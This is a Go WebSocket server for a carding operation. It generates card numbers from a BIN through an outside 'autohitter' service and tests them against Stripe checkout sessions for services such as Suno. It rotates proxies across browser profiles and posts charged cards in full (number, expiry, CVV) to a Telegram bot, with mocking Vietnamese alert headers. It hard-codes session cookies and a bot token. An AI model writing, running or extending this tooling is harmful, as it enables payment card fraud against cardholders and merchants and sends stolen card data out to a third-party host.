package main

import (
	"bufio"
	"context"
	"crypto/sha1"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	defaultPort = 9877
	wsMagicGUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
)

const (
	defaultHitchkrBase = "https://hitchecker.top"
	defaultHitchkrSID  = "s%3AlL8BLxfS2JCV1Cwg_O8tg4IbSf7jIYNt.J77mCGI3l5qHiYU6wHHSq9lZkTKlsBA5nj27iXJRWNA"
	defaultHitchkrSess = "s%3Ay1_PSjNh6Nbs0__L6eOrD6BeVyye97KE.ETt4V6bcpXBIq9teOU5nAb22ss0eMJOMbWVqoG3e41o"
	defaultBotToken    = "8757846974:AAErG-Bmy9xoSrLmGbQb3Sw4m2TwTCuCMWI"
)

var (
	port             = envInt("PORT", defaultPort)
	hitchkrBase      = envString("HITCHKR_BASE", defaultHitchkrBase)
	hitchkrConnectID = envString("HITCHKR_CONNECT_SID", defaultHitchkrSID)
	hitchkrSessionID = envString("HITCHKR_SESSION", defaultHitchkrSess)
	telegramBotToken = envString("TELEGRAM_BOT_TOKEN", defaultBotToken)
	vnLocation       = mustLoadLocation("Asia/Ho_Chi_Minh")
	httpState        = newHTTPState()
	hitchkrState     = &cookieCheckState{}
	sheetQueueFile   = envString("SHEET_QUEUE_STATE_FILE", "sheet_queue_state.json")

	// GPM orchestrator done-state store
	gpmMu      sync.Mutex
	gpmDoneMap = map[string]bool{} // profileId → done

	// GPM charge success tracker (for proxy rotation monitor)
	gpmLastChargeMu   sync.Mutex
	gpmLastChargeTime = time.Now() // initialise to now so monitor doesn't fire immediately

	// GPM manual rotate flag (set by UI, cleared by orchestrator)
	gpmRotateMu      sync.Mutex
	gpmRotatePending bool

	// GPM auto-rotate enabled flag (toggled by UI button, polled by orchestrator monitor)
	gpmAutoRotateMu      sync.Mutex
	gpmAutoRotateEnabled = true // default: auto-rotation ON

	// Sheet claim locks serialize Google Sheet account/token claims across profiles.
	sheetClaimMu    sync.Mutex
	sheetClaimLocks = map[string]sheetClaimLock{}

	// Sheet queue claims coordinate row selection before the extension writes back to Google Sheet.
	sheetQueueMu     sync.Mutex
	sheetQueueLoaded bool
	sheetQueueRows   = map[string]sheetQueueRowState{}

	// WebSocket client registry – used for hot-card server-push broadcast
	wsClientsMu sync.Mutex
	wsClients   = map[*wsConn]struct{}{}

	telegramDedupeMu   sync.Mutex
	telegramDedupeKeys = map[string]time.Time{}
)

var checkoutSessionRe = regexp.MustCompile(`(?i)cs_(?:test|live)_[A-Za-z0-9_]+`)

type wsRequest struct {
	RequestID string          `json:"requestId"`
	Type      string          `json:"type"`
	Data      json.RawMessage `json:"data"`
}

type wsResponse struct {
	RequestID string `json:"requestId,omitempty"`
	Result    any    `json:"result,omitempty"`
	Error     string `json:"error,omitempty"`
}

type generateCardsRequest struct {
	Bin    string `json:"bin"`
	Amount int    `json:"amount"`
}

type tryStripeCardRequest struct {
	CheckoutURL  string `json:"checkoutUrl"`
	Card         string `json:"card"`
	SessionCache any    `json:"sessionCache"`
}

type sendTelegramRequest struct {
	Card             string         `json:"card"`
	Result           map[string]any `json:"result"`
	CheckoutURL      string         `json:"checkoutUrl"`
	Bin              string         `json:"bin"`
	TelegramChatID   string         `json:"telegramChatId"`
	Email            string         `json:"email"`
	DiscordToken     string         `json:"discordToken"`
	Name             string         `json:"name"`
	NotiType         string         `json:"notiType"`
	ThreeDsLinkCount any            `json:"threeDsLinkCount"`
	ThreeDsThreshold any            `json:"threeDsThreshold"`
}

type setProxyRequest struct {
	Enabled bool   `json:"enabled"`
	Proxy   string `json:"proxy"`
}

type sheetClaimLock struct {
	Owner     string
	ExpiresAt time.Time
}

type sheetQueueRowState struct {
	Source    string    `json:"source"`
	SheetID   string    `json:"sheetId"`
	SheetName string    `json:"sheetName"`
	RowIndex  int       `json:"rowIndex"`
	Owner     string    `json:"owner,omitempty"`
	Status    string    `json:"status"`
	Result    string    `json:"result,omitempty"`
	UpdatedAt time.Time `json:"updatedAt"`
	ExpiresAt time.Time `json:"expiresAt"`
}

type sheetQueueCandidate struct {
	RowIndex       int    `json:"rowIndex"`
	PreviousStatus string `json:"previousStatus,omitempty"`
	NextStatus     string `json:"nextStatus,omitempty"`
}

type sheetQueueClaimRequest struct {
	Source     string                `json:"source"`
	SheetID    string                `json:"sheetId"`
	SheetName  string                `json:"sheetName"`
	Owner      string                `json:"owner"`
	TTLMS      int                   `json:"ttlMs"`
	Candidates []sheetQueueCandidate `json:"candidates"`
}

type sheetQueueRowRequest struct {
	Source    string `json:"source"`
	SheetID   string `json:"sheetId"`
	SheetName string `json:"sheetName"`
	RowIndex  int    `json:"rowIndex"`
	Owner     string `json:"owner"`
	Result    string `json:"result,omitempty"`
	KeepMS    int    `json:"keepMs,omitempty"`
}

type proxyConfig struct {
	Enabled bool
	Proxy   string
}

type httpStateManager struct {
	mu           sync.RWMutex
	config       proxyConfig
	client       *http.Client
	transport    *http.Transport
	directClient *http.Client
}

type cookieCheckState struct {
	mu      sync.Mutex
	checked bool
}

type wsConn struct {
	conn net.Conn
	rw   *bufio.ReadWriter
	mu   sync.Mutex
}

func main() {
	log.SetFlags(0)

	server := &http.Server{
		Addr:              fmt.Sprintf(":%d", port),
		Handler:           buildMux(),
		ReadHeaderTimeout: 5 * time.Second,
	}

	logf("WebSocket server running on ws://localhost:%d", port)
	logf("Proxy: OFF (direct)")

	if err := server.ListenAndServe(); err != nil && !errors.Is(err, http.ErrServerClosed) {
		if isAddrInUseError(err) {
			logf("Port %d already in use. Kill the other process or change PORT.", port)
			return
		}
		logf("Server error: %v", err)
	}
}

func buildMux() http.Handler {
	mux := http.NewServeMux()

	mux.HandleFunc("/healthz", handleHealthz)

	// WebSocket upgrade (all paths not otherwise matched)
	mux.HandleFunc("/", handleUpgrade)

	// GPM orchestrator: poll done state
	// GET /gpm/done?id={profileId} → {"done": true/false, "id": "..."}
	mux.HandleFunc("/gpm/done", func(w http.ResponseWriter, r *http.Request) {
		id := r.URL.Query().Get("id")
		gpmMu.Lock()
		done := gpmDoneMap[id]
		if done {
			delete(gpmDoneMap, id) // auto-clear after first successful read
		}
		gpmMu.Unlock()
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]any{"done": done, "id": id})
	})

	// GPM charge success timestamp (for Python proxy-rotation monitor)
	// GET /gpm/last_charge → {"ts": <unix_seconds>}
	mux.HandleFunc("/gpm/last_charge", func(w http.ResponseWriter, r *http.Request) {
		gpmLastChargeMu.Lock()
		ts := gpmLastChargeTime.Unix()
		gpmLastChargeMu.Unlock()
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]any{"ts": ts})
	})

	// GPM manual proxy rotation trigger
	// POST /gpm/rotate_proxy → sets pending flag (called by UI button)
	// GET  /gpm/rotate_proxy → {"pending": true/false} + auto-clear (polled by orchestrator monitor)
	mux.HandleFunc("/gpm/rotate_proxy", func(w http.ResponseWriter, r *http.Request) {
		gpmRotateMu.Lock()
		defer gpmRotateMu.Unlock()
		if r.Method == http.MethodPost {
			gpmRotatePending = true
			logf("GPM: manual rotate_proxy requested")
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(map[string]any{"ok": true})
			return
		}
		// GET: read + auto-clear
		pending := gpmRotatePending
		if pending {
			gpmRotatePending = false
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]any{"pending": pending})
	})

	// GPM auto-rotate toggle
	// GET  /gpm/auto_rotate → {"enabled": true/false}
	// POST /gpm/auto_rotate → body {"enabled": bool} → sets flag
	mux.HandleFunc("/gpm/auto_rotate", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		if r.Method == http.MethodPost {
			var body struct {
				Enabled bool `json:"enabled"`
			}
			if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
				http.Error(w, "bad json", http.StatusBadRequest)
				return
			}
			gpmAutoRotateMu.Lock()
			gpmAutoRotateEnabled = body.Enabled
			gpmAutoRotateMu.Unlock()
			state := "ENABLED"
			if !body.Enabled {
				state = "DISABLED"
			}
			logf("GPM: auto-rotate %s", state)
			json.NewEncoder(w).Encode(map[string]any{"ok": true, "enabled": body.Enabled})
			return
		}
		// GET: return current state
		gpmAutoRotateMu.Lock()
		enabled := gpmAutoRotateEnabled
		gpmAutoRotateMu.Unlock()
		json.NewEncoder(w).Encode(map[string]any{"enabled": enabled})
	})

	return mux
}

func isAddrInUseError(err error) bool {
	if err == nil {
		return false
	}
	if errors.Is(err, syscall.EADDRINUSE) {
		return true
	}

	message := strings.ToLower(err.Error())
	return strings.Contains(message, "address already in use") ||
		strings.Contains(message, "only one usage of each socket address")
}

func handleHealthz(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet && r.Method != http.MethodHead {
		w.Header().Set("Allow", "GET, HEAD")
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")
	w.WriteHeader(http.StatusOK)
	if r.Method == http.MethodHead {
		return
	}
	_ = json.NewEncoder(w).Encode(map[string]any{
		"ok":      true,
		"service": "ws-server-go",
		"port":    port,
		"time":    time.Now().UTC().Format(time.RFC3339),
	})
}

func handleUpgrade(w http.ResponseWriter, r *http.Request) {
	if !headerContainsToken(r.Header, "Connection", "Upgrade") || !headerContainsToken(r.Header, "Upgrade", "websocket") {
		http.Error(w, "Expected WebSocket upgrade", http.StatusBadRequest)
		return
	}
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	key := strings.TrimSpace(r.Header.Get("Sec-WebSocket-Key"))
	if key == "" {
		http.Error(w, "Missing Sec-WebSocket-Key", http.StatusBadRequest)
		return
	}

	hijacker, ok := w.(http.Hijacker)
	if !ok {
		http.Error(w, "Hijacking not supported", http.StatusInternalServerError)
		return
	}

	conn, rw, err := hijacker.Hijack()
	if err != nil {
		http.Error(w, "Hijack failed", http.StatusInternalServerError)
		return
	}

	accept := websocketAccept(key)
	if _, err := fmt.Fprintf(
		rw,
		"HTTP/1.1 101 Switching Protocols\r\n"+
			"Upgrade: websocket\r\n"+
			"Connection: Upgrade\r\n"+
			"Sec-WebSocket-Accept: %s\r\n\r\n",
		accept,
	); err != nil {
		_ = conn.Close()
		return
	}
	if err := rw.Flush(); err != nil {
		_ = conn.Close()
		return
	}

	client := &wsConn{conn: conn, rw: rw}
	registerWsClient(client)
	logf("Client connected")
	go client.readLoop()
}

func (c *wsConn) readLoop() {
	stop := make(chan struct{})
	go c.pingLoop(stop)
	defer func() {
		unregisterWsClient(c)
		close(stop)
		logf("Client disconnected")
		_ = c.conn.Close()
	}()

	for {
		opcode, payload, err := readFrame(c.rw.Reader)
		if err != nil {
			if !errors.Is(err, io.EOF) {
				logf("WS error: %v", err)
			}
			return
		}

		switch opcode {
		case 0x1:
			message := append([]byte(nil), payload...)
			go c.handleTextMessage(message)
		case 0x8:
			_ = c.writeControlFrame(0x8, nil)
			return
		case 0x9:
			_ = c.writeControlFrame(0xA, payload)
		case 0xA:
			continue
		default:
			logf("WS error: unsupported opcode %d", opcode)
			return
		}
	}
}

// pingLoop sends a WS ping every 15s to keep the connection alive
// (prevents Chrome Service Worker from closing idle WS during long requests).
func (c *wsConn) pingLoop(stop <-chan struct{}) {
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ticker.C:
			if err := c.writeControlFrame(0x9, []byte("keepalive")); err != nil {
				logf("Ping failed (connection likely dead): %v", err)
				return
			}
		case <-stop:
			return
		}
	}
}

func (c *wsConn) handleTextMessage(payload []byte) {
	startedAt := time.Now()

	var req wsRequest
	if err := json.Unmarshal(payload, &req); err != nil {
		logf("WS request invalid_json: bytes=%d duration=%s", len(payload), formatDuration(time.Since(startedAt)))
		_ = c.sendJSON(wsResponse{Error: "Invalid JSON"})
		return
	}

	logf("WS request start: id=%s type=%s bytes=%d", req.RequestID, req.Type, len(payload))

	// gpm_share_hot_card needs the sender's *wsConn for broadcast exclusion
	if req.Type == "gpm_share_hot_card" {
		result, err := c.handleShareHotCard(req.Data)
		if err != nil {
			logf("WS request failed: id=%s type=%s duration=%s error=%v", req.RequestID, req.Type, formatDuration(time.Since(startedAt)), err)
			_ = c.sendJSON(wsResponse{RequestID: req.RequestID, Error: err.Error()})
			return
		}
		if err := c.sendJSON(wsResponse{RequestID: req.RequestID, Result: result}); err != nil {
			logf("WS response failed: id=%s type=%s duration=%s error=%v", req.RequestID, req.Type, formatDuration(time.Since(startedAt)), err)
			return
		}
		logf("WS request done: id=%s type=%s duration=%s", req.RequestID, req.Type, formatDuration(time.Since(startedAt)))
		return
	}

	handler, ok := handlers[req.Type]
	if !ok {
		logf("WS request failed: id=%s type=%s duration=%s error=unknown type", req.RequestID, req.Type, formatDuration(time.Since(startedAt)))
		_ = c.sendJSON(wsResponse{
			RequestID: req.RequestID,
			Error:     fmt.Sprintf("Unknown type: %s", req.Type),
		})
		return
	}

	result, err := handler(req.Data)
	if err != nil {
		logf("WS request failed: id=%s type=%s duration=%s error=%v", req.RequestID, req.Type, formatDuration(time.Since(startedAt)), err)
		_ = c.sendJSON(wsResponse{
			RequestID: req.RequestID,
			Error:     err.Error(),
		})
		return
	}

	if err := c.sendJSON(wsResponse{
		RequestID: req.RequestID,
		Result:    result,
	}); err != nil {
		logf("WS response failed: id=%s type=%s duration=%s error=%v", req.RequestID, req.Type, formatDuration(time.Since(startedAt)), err)
		return
	}

	logf("WS request done: id=%s type=%s duration=%s", req.RequestID, req.Type, formatDuration(time.Since(startedAt)))
}

func (c *wsConn) sendJSON(v any) error {
	data, err := json.Marshal(v)
	if err != nil {
		return err
	}
	return c.writeTextFrame(data)
}

func (c *wsConn) writeTextFrame(payload []byte) error {
	return c.writeFrame(0x1, payload)
}

func (c *wsConn) writeControlFrame(opcode byte, payload []byte) error {
	return c.writeFrame(opcode, payload)
}

func (c *wsConn) writeFrame(opcode byte, payload []byte) error {
	c.mu.Lock()
	defer c.mu.Unlock()

	// Set a write deadline so we never hang on a dead connection
	_ = c.conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	defer func() { _ = c.conn.SetWriteDeadline(time.Time{}) }()

	header := []byte{0x80 | opcode}
	payloadLen := len(payload)
	switch {
	case payloadLen <= 125:
		header = append(header, byte(payloadLen))
	case payloadLen <= 65535:
		header = append(header, 126, byte(payloadLen>>8), byte(payloadLen))
	default:
		header = append(header, 127)
		buf := make([]byte, 8)
		binary.BigEndian.PutUint64(buf, uint64(payloadLen))
		header = append(header, buf...)
	}

	if _, err := c.rw.Write(header); err != nil {
		return err
	}
	if _, err := c.rw.Write(payload); err != nil {
		return err
	}
	return c.rw.Flush()
}

func hitchkrHeaders() map[string]string {
	return map[string]string{
		"Accept":             "*/*",
		"Accept-Language":    "vi",
		"Cache-Control":      "no-cache",
		"Content-Type":       "application/json",
		"Origin":             hitchkrBase,
		"Pragma":             "no-cache",
		"Priority":           "u=1, i",
		"Referer":            hitchkrBase + "/autohitter",
		"Sec-Ch-Ua":          `"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"`,
		"Sec-Ch-Ua-Mobile":   "?0",
		"Sec-Ch-Ua-Platform": `"Windows"`,
		"Sec-Fetch-Dest":     "empty",
		"Sec-Fetch-Mode":     "cors",
		"Sec-Fetch-Site":     "same-origin",
		"User-Agent":         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36",
		"Cookie":             "connect.sid=" + hitchkrConnectID,
	}
}

var handlers = map[string]func(json.RawMessage) (any, error){
	"generate_cards":           handleGenerateCards,
	"try_stripe_card":          handleTryStripeCard,
	"send_telegram":            handleSendTelegram,
	"set_proxy":                handleSetProxy,
	"gpm_report_done":          handleGpmReportDone,
	"gpm_charge_success":       handleGpmChargeSuccess,
	"sheet_claim_lock_acquire": handleSheetClaimLockAcquire,
	"sheet_claim_lock_release": handleSheetClaimLockRelease,
	"sheet_queue_claim":        handleSheetQueueClaim,
	"sheet_queue_complete":     handleSheetQueueComplete,
	"sheet_queue_release":      handleSheetQueueRelease,
}

func handleGenerateCards(raw json.RawMessage) (any, error) {
	var data generateCardsRequest
	if err := json.Unmarshal(raw, &data); err != nil {
		return nil, err
	}

	ensureHitchkrCookie(context.Background())

	payload, statusCode, err := postJSON(
		context.Background(),
		"generate_cards",
		hitchkrBase+"/api/tools/generate",
		hitchkrHeaders(),
		map[string]any{
			"bin":    data.Bin,
			"amount": data.Amount,
			"month":  "xx",
			"year":   "xx",
			"cvv":    "xxx",
		},
	)
	if err != nil {
		return nil, err
	}

	respMap, _ := payload.(map[string]any)
	cards := anySlice(respMap["cards"])
	if statusCode < 200 || statusCode >= 300 || len(cards) == 0 {
		detail := "No cards generated"
		if s, ok := payload.(string); ok && strings.TrimSpace(s) != "" {
			detail = s
		} else if errText := stringValue(respMap["error"]); errText != "" {
			detail = errText
		}
		return nil, fmt.Errorf("Generate cards failed (%d): %s", statusCode, detail)
	}

	logf("Generated %d cards for BIN %s", len(cards), data.Bin)
	return map[string]any{"cards": cards}, nil
}

func handleTryStripeCard(raw json.RawMessage) (any, error) {
	var data tryStripeCardRequest
	if err := json.Unmarshal(raw, &data); err != nil {
		return nil, err
	}

	ensureHitchkrCookie(context.Background())

	body := map[string]any{
		"checkoutUrl": data.CheckoutURL,
		"card":        data.Card,
	}
	if data.SessionCache != nil {
		body["session_cache"] = data.SessionCache
	}

	payload, _, err := postJSON(
		context.Background(),
		"try_stripe_card",
		hitchkrBase+"/api/tools/stripe-co",
		hitchkrHeaders(),
		body,
	)
	if err != nil {
		return nil, err
	}

	respMap, _ := payload.(map[string]any)
	cardShort := data.Card
	if idx := strings.Index(cardShort, "|"); idx >= 0 {
		cardShort = cardShort[:idx]
	}

	// Normalize 3DS: any message containing "3DS" → return exactly "3DS"
	// so the overlay colors it yellow (r.status === "3DS").
	rawStatus := stringValue(respMap["status"])
	rawMessage := stringValue(respMap["message"])
	normalize := func(s string) string {
		if strings.Contains(strings.ToUpper(s), "3DS") {
			return "3DS"
		}
		return s
	}

	displayStatus := normalize(defaultString(rawMessage, defaultString(rawStatus, "unknown")))

	// Enrich session_cache: add success_url if missing.
	// Hitchecker's API returns session_cache but sometimes omits success_url.
	// Subsequent card requests that pass session_cache NEED success_url for Stripe
	// to redirect after payment confirmation – without it, checkout_confirm_error occurs.
	// The success_url follows the known Suno redirect pattern: /create?checkout_session_id=<id>
	if sc, ok := respMap["session_cache"].(map[string]any); ok {
		if _, has := sc["success_url"]; !has {
			if sid := stringValue(sc["session_id"]); sid != "" {
				sc["success_url"] = "https://suno.com/create?checkout_session_id=" + sid
				logf("Stripe-co: enriched session_cache with success_url for session %s...", sid[:min(len(sid), 30)])
			}
		}
	}

	logf(
		"Stripe-co %s***: message=%s status=%s display=%s, session=%s",
		cardShort,
		rawMessage,
		rawStatus,
		displayStatus,
		stringValue(mapValue(respMap["session_cache"])["session_id"]),
	)

	return map[string]any{
		"status":       rawStatus,     // raw status for logic (e.g. "charged", "declined")
		"display":      displayStatus, // display text for overlay (uses message if available)
		"message":      rawMessage,    // raw message from Stripe
		"sessionCache": respMap["session_cache"],
		"raw":          payload,
	}, nil

}

func trimDedupePart(value string, maxLen int) string {
	value = strings.TrimSpace(value)
	if maxLen > 0 && len(value) > maxLen {
		return value[:maxLen]
	}
	return value
}

func normalizeTelegramDedupeValue(value string) string {
	return strings.ToLower(strings.TrimSpace(value))
}

func digitsOnly(value string) string {
	var b strings.Builder
	for _, r := range value {
		if r >= '0' && r <= '9' {
			b.WriteRune(r)
		}
	}
	return b.String()
}

func normalizeTelegramCardValue(card string) string {
	raw := strings.TrimSpace(card)
	if raw == "" {
		return ""
	}
	parts := strings.Split(raw, "|")
	if len(parts) >= 4 {
		out := make([]string, 0, 4)
		for i := 0; i < 4; i++ {
			part := strings.TrimSpace(parts[i])
			if part == "" {
				return ""
			}
			out = append(out, part)
		}
		return strings.ToLower(strings.Join(out, "|"))
	}
	digits := digitsOnly(raw)
	if len(digits) >= 13 && len(digits) <= 19 {
		return digits
	}
	return ""
}

func normalizeTelegramCheckoutValue(checkoutURL string) string {
	raw := strings.TrimSpace(checkoutURL)
	if raw == "" {
		return ""
	}
	if parsed, err := url.Parse(raw); err == nil {
		query := parsed.Query()
		for _, name := range []string{"checkout_session_id", "session_id"} {
			if value := strings.TrimSpace(query.Get(name)); value != "" {
				return normalizeTelegramDedupeValue(value)
			}
		}
		for _, part := range strings.Split(parsed.Path, "/") {
			if match := checkoutSessionRe.FindString(part); match != "" {
				return normalizeTelegramDedupeValue(match)
			}
		}
	}
	if match := checkoutSessionRe.FindString(raw); match != "" {
		return normalizeTelegramDedupeValue(match)
	}
	return trimDedupePart(normalizeTelegramDedupeValue(raw), 240)
}

func chargedTelegramNotificationKeys(data sendTelegramRequest) []string {
	keys := []string{}
	seen := map[string]bool{}
	chatKey := trimDedupePart(normalizeTelegramDedupeValue(data.TelegramChatID), 80)
	add := func(key string) {
		if key == "" {
			return
		}
		key = "chat|" + chatKey + "|" + key
		if seen[key] {
			return
		}
		seen[key] = true
		keys = append(keys, key)
	}

	checkoutKey := normalizeTelegramCheckoutValue(data.CheckoutURL)
	cardKey := normalizeTelegramCardValue(data.Card)
	binKey := trimDedupePart(normalizeTelegramDedupeValue(data.Bin), 32)
	identityKey := trimDedupePart(normalizeTelegramDedupeValue(defaultString(data.DiscordToken, defaultString(data.Email, data.Name))), 80)

	if checkoutKey != "" {
		add("charged|checkout|" + checkoutKey)
	}
	if cardKey != "" {
		add("charged|card|" + cardKey)
	}
	if checkoutKey != "" && cardKey != "" {
		add("charged|checkout_card|" + checkoutKey + "|" + cardKey)
	}
	if checkoutKey != "" && identityKey != "" {
		add("charged|checkout_identity|" + checkoutKey + "|" + identityKey)
	}
	if checkoutKey == "" && cardKey == "" && binKey != "" && identityKey != "" {
		add("charged|bin_identity|" + binKey + "|" + identityKey)
	}
	if len(keys) == 0 {
		add(strings.Join([]string{
			"charged",
			trimDedupePart(data.CheckoutURL, 180),
			trimDedupePart(data.Bin, 24),
			trimDedupePart(defaultString(data.DiscordToken, defaultString(data.Email, data.Name)), 80),
		}, "||"))
	}
	return keys
}

func handleSendTelegram(raw json.RawMessage) (any, error) {
	var data sendTelegramRequest
	if err := json.Unmarshal(raw, &data); err != nil {
		return nil, err
	}

	if data.NotiType == "pah_card_test" {
		logf("Telegram: skipped deprecated PAH card-test notification")
		return map[string]any{"ok": true, "skipped": true, "reason": "deprecated_pah_card_test"}, nil
	}

	if strings.TrimSpace(data.TelegramChatID) == "" {
		logf("Telegram: No chat ID, skipping")
		return map[string]any{"ok": false, "reason": "no_chat_id"}, nil
	}

	if data.NotiType == "charged" || strings.EqualFold(stringValue(data.Result["status"]), "charged") || strings.EqualFold(stringValue(data.Result["status"]), "success") {
		keys := chargedTelegramNotificationKeys(data)
		nowDedupe := time.Now()
		telegramDedupeMu.Lock()
		for k, seenAt := range telegramDedupeKeys {
			if nowDedupe.Sub(seenAt) > 2*time.Hour {
				delete(telegramDedupeKeys, k)
			}
		}
		for _, key := range keys {
			if _, exists := telegramDedupeKeys[key]; exists {
				telegramDedupeMu.Unlock()
				logf("Telegram: skipped duplicate charged notification")
				return map[string]any{"ok": true, "skipped": true, "reason": "duplicate_charged"}, nil
			}
		}
		for _, key := range keys {
			telegramDedupeKeys[key] = nowDedupe
		}
		telegramDedupeMu.Unlock()
	}

	number, month, year, cvv := splitCard(data.Card)
	rawResult := mapValue(data.Result["raw"])
	session := mapValue(rawResult["session_cache"])
	now := time.Now().In(vnLocation).Format("02/01/2006 15:04:05")

	// Discord token to display (fallback to email for backwards compat)
	discordDisplay := data.DiscordToken
	if discordDisplay == "" {
		discordDisplay = data.Email
	}
	if discordDisplay == "" {
		discordDisplay = "N/A"
	}

	isIncorrectCVC := data.NotiType == "incorrect_cvc"
	isThreeDSAlert := data.NotiType == "threeds_account_alert"
	isPahCardTest := data.NotiType == "pah_card_test"

	header := "✅ *SUNO SVIP \\- Đã bú thành công\\!*"
	if isIncorrectCVC {
		header = "🔥 *SUNO SVIP \\- Địt cụ mém bú \\!*"
	} else if isThreeDSAlert {
		header = "⚠️ *SUNO SVIP \\- Account dính 3DS liên tục*"
	} else if isPahCardTest {
		header = "🧪 *SUNO SVIP \\- PAH Card Test*"
	}

	statusText := escapeMarkdownV2(defaultString(stringValue(data.Result["status"]), "charged"))
	messageText := escapeMarkdownV2(defaultString(stringValue(rawResult["message"]), "N/A"))
	if isIncorrectCVC {
		statusText = "Khóc"
		messageText = "Như cứt"
	} else if isPahCardTest {
		statusText = "PAH Charged"
		messageText = escapeMarkdownV2(defaultString(stringValue(rawResult["message"]), "Detected in Checkout toast"))
	}

	linkURL := strings.ReplaceAll(data.CheckoutURL, ")", "\\)")

	var message string
	if isThreeDSAlert {
		message = strings.Join([]string{
			header,
			"",
			fmt.Sprintf("👤 *Name:* `%s`", escapeMarkdownV2(defaultString(data.Name, "N/A"))),
			fmt.Sprintf("🤖 *Discord:* `%s`", escapeMarkdownV2(discordDisplay)),
			fmt.Sprintf("🏷 *BIN:* `%s`", defaultString(data.Bin, "?")),
			"📊 *Status:* 3DS Link Streak",
			fmt.Sprintf(
				"💬 *Message:* %s",
				escapeMarkdownV2(defaultString(
					stringValue(rawResult["message"]),
					fmt.Sprintf("%s checkout links lien tiep bi 3DS x%s", stringValue(data.ThreeDsLinkCount), stringValue(data.ThreeDsThreshold)),
				)),
			),
			fmt.Sprintf("🔁 *Consecutive Links:* %s", escapeMarkdownV2(defaultString(stringValue(data.ThreeDsLinkCount), "0"))),
			fmt.Sprintf("🔗 *Checkout:* [Link](%s)", linkURL),
			"",
			fmt.Sprintf("⏰ *Time:* %s", escapeMarkdownV2(now)),
		}, "\n")
	} else {
		message = strings.Join([]string{
			header,
			"",
			fmt.Sprintf("👤 *Name:* `%s`", escapeMarkdownV2(defaultString(data.Name, "N/A"))),
			fmt.Sprintf("🤖 *Discord:* `%s`", escapeMarkdownV2(discordDisplay)),
			fmt.Sprintf(
				"💳 *Card:* `%s|%s|%s|%s`",
				defaultString(number, "?"),
				defaultString(month, "?"),
				defaultString(year, "?"),
				defaultString(cvv, "?"),
			),
			fmt.Sprintf("🏷 *BIN:* `%s`", defaultString(data.Bin, "?")),
			fmt.Sprintf("📊 *Status:* %s", statusText),
			fmt.Sprintf("💬 *Message:* %s", messageText),
			"",
			fmt.Sprintf("🏪 *Merchant:* %s", escapeMarkdownV2(defaultString(stringValue(session["merchant"]), "KLING AI"))),
			fmt.Sprintf(
				"💰 *Amount:* %s %s",
				escapeMarkdownV2(defaultString(stringValue(session["amount"]), "N/A")),
				escapeMarkdownV2(stringValue(session["currency"])),
			),
			fmt.Sprintf("🔗 *Checkout:* [Link](%s)", linkURL),
			"",
			fmt.Sprintf("⏰ *Time:* %s", escapeMarkdownV2(now)),
		}, "\n")
	}

	payload, _, err := postJSON(
		context.Background(),
		"send_telegram",
		"https://api.telegram.org/bot"+telegramBotToken+"/sendMessage",
		map[string]string{
			"Content-Type": "application/json",
		},
		map[string]any{
			"chat_id":                  data.TelegramChatID,
			"text":                     message,
			"parse_mode":               "MarkdownV2",
			"disable_web_page_preview": true,
		},
	)
	if err != nil {
		return nil, err
	}

	respMap := mapValue(payload)
	ok, _ := respMap["ok"].(bool)
	if ok {
		logf("Telegram: Notification sent successfully")
	} else {
		logf("Telegram: Failed: %s", stringValue(respMap["description"]))
	}
	return map[string]any{"ok": ok}, nil
}

func handleSetProxy(raw json.RawMessage) (any, error) {
	var data setProxyRequest
	if err := json.Unmarshal(raw, &data); err != nil {
		return nil, err
	}

	httpState.setProxy(data.Enabled, data.Proxy)
	status := "OFF"
	if data.Enabled {
		if strings.TrimSpace(data.Proxy) == "" {
			status = "ON (no address)"
		} else {
			status = data.Proxy
		}
	}
	logf("Proxy: %s", status)
	return map[string]any{"ok": true}, nil
}

func readFrame(r *bufio.Reader) (byte, []byte, error) {
	first, err := r.ReadByte()
	if err != nil {
		return 0, nil, err
	}
	second, err := r.ReadByte()
	if err != nil {
		return 0, nil, err
	}

	fin := first&0x80 != 0
	opcode := first & 0x0F
	masked := second&0x80 != 0
	payloadLen := uint64(second & 0x7F)

	switch payloadLen {
	case 126:
		var shortLen uint16
		if err := binary.Read(r, binary.BigEndian, &shortLen); err != nil {
			return 0, nil, err
		}
		payloadLen = uint64(shortLen)
	case 127:
		if err := binary.Read(r, binary.BigEndian, &payloadLen); err != nil {
			return 0, nil, err
		}
	}

	if !fin {
		return 0, nil, errors.New("fragmented frames are not supported")
	}

	var maskKey [4]byte
	if masked {
		if _, err := io.ReadFull(r, maskKey[:]); err != nil {
			return 0, nil, err
		}
	}

	if payloadLen > uint64(^uint(0)>>1) {
		return 0, nil, errors.New("frame too large")
	}

	payload := make([]byte, int(payloadLen))
	if _, err := io.ReadFull(r, payload); err != nil {
		return 0, nil, err
	}

	if masked {
		for i := range payload {
			payload[i] ^= maskKey[i%4]
		}
	}

	return opcode, payload, nil
}

func websocketAccept(key string) string {
	sum := sha1.Sum([]byte(key + wsMagicGUID))
	return base64.StdEncoding.EncodeToString(sum[:])
}

func headerContainsToken(header http.Header, key string, want string) bool {
	for _, value := range header.Values(key) {
		for _, token := range strings.Split(value, ",") {
			if strings.EqualFold(strings.TrimSpace(token), want) {
				return true
			}
		}
	}
	return false
}

